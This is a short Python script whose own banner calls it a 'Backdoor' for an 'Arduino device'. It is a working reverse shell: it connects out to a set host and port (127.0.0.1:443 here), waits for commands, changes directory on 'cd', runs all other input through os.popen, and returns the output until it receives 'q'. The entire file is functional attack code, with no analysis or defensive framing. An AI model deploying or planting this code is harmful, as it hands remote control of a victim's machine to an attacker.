rhost="127.0.0.1"
rport=443
import socket,os
s=socket.socket()
s.connect((rhost ,rport))
s.send('''
             ###########################
             #       Backdoor          #
             #    Arduino device       #
             ###########################''')
while 1:
    data = s.recv(512)
    if "q" == data.lower():
        s.close()
        break;
    else:
        if data.startswith('cd'):
            os.chdir(data[3:].replace('\n',''))
            s.send("Moved to "+str(os.getcwd()))
            result='\n'
        else:
            result=os.popen(data).read()
    if (data.lower() != "q"):
            s.send(str(result)+"Consol: ")
    else:
        s.send(str(result))
        s.close()
        break;
exit()
